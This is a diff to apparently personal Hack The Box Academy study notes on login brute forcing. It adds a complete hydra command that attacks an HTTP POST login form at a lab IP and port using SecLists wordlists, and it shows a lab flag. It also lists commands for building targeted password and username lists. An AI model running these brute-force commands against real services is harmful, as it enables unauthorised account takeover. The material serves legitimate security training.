@@ -27,17 +27,35 @@
 | --------------|-------------------|
 | `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist [Dictionary Attack - SecLists repo for wordlists](https://github.com/danielmiessler/SecLists) |
 | `/usr/share/wordlists/rockyou.txt` | The most Common Passwords Wordlist |
+| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt` | The seclists Passwords in this Leaked-Databases file rockyou-10 contain 92 entries. |
 | `/usr/share/seclists/Usernames/Names/names.txt` | Common Names Wordlist |
 
-# Misc
+# Default Passwords  
+
+>It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged.
+>[Default Passwords - Login Brute Force](https://academy.hackthebox.com/module/57/section/498) POST Form:  
+
+```
+hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f 83.136.251.168 -s 52278 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+```  
+
+>[HYDRA - Brute Forcing Forms](https://academy.hackthebox.com/module/57/section/489)  
+>[Username Brute Force](https://academy.hackthebox.com/module/57/section/487)  
+
+![default-passwords HTB{bru73_f0rc1n6_15_4_l457_r350r7}](/images/default-passwords.png)  
+
+>Above screenshot show using Burp Proxy to [Determine Login Parameters](https://academy.hackthebox.com/module/57/section/504)  
+
+# Personalized Wordlists  
 
 | **Command**   | **Description**   |
 | --------------|-------------------|
-| `cupp -i` | Creating Custom Password Wordlist |
+| `cupp -i` | Creating Custom Password Wordlist [Personalized Wordlists](https://academy.hackthebox.com/module/57/section/512) |
 | `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
 | ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
 | `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
-| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List |
+| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List [GITHUB Username Anarchy](https://github.com/urbanadventurer/username-anarchy) |
 | `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
 | `ftp 127.0.0.1` | FTP to Server |
 | `su - user` | Switch to User |
+
